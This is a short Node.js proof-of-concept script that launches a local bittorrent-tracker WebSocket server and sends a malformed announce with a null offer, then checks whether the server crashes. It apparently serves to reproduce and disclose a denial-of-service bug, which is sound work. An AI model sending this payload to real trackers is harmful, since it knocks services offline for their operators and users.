// The exact documented command (`bittorrent-tracker --ws`) and one malformed announce.
import { spawn } from 'node:child_process'
import WebSocket from 'ws'
const bin = (n) => Array.from({ length: n }, () => String.fromCharCode(Math.floor(Math.random() * 256))).join('')
const p = spawn(process.execPath, ['node_modules/bittorrent-tracker/bin/cmd.js', '--ws', '--port', '18123'], { stdio: ['ignore', 'pipe', 'pipe'] })
let out = ''; p.stdout.on('data', (d) => { out += d }); p.stderr.on('data', (d) => { out += d })
const exited = new Promise((r) => p.on('exit', (code, sig) => r({ code, sig })))
await new Promise((r) => setTimeout(r, 1500))
const ih = bin(20)
const open = () => new Promise((res) => { const w = new WebSocket('ws://127.0.0.1:18123'); w.on('open', () => res(w)) })
const a = await open(); const b = await open()
const ann = (peer, extra) => JSON.stringify({ action: 'announce', info_hash: ih, peer_id: peer, left: 1, event: 'started', ...extra })
a.send(ann(bin(20), { numwant: 0, offers: [] })); await new Promise((r) => setTimeout(r, 200))
b.send(ann(bin(20), { numwant: 1, offers: [null] }))
const r = await Promise.race([exited, new Promise((r) => setTimeout(() => r('STILL RUNNING after 3 s'), 3000))])
console.log('result:', JSON.stringify(r)); console.log(out.split('\n').filter((l) => /TypeError|server.js/.test(l)).slice(0, 2).join('\n'))
p.kill('SIGKILL'); process.exit(0)
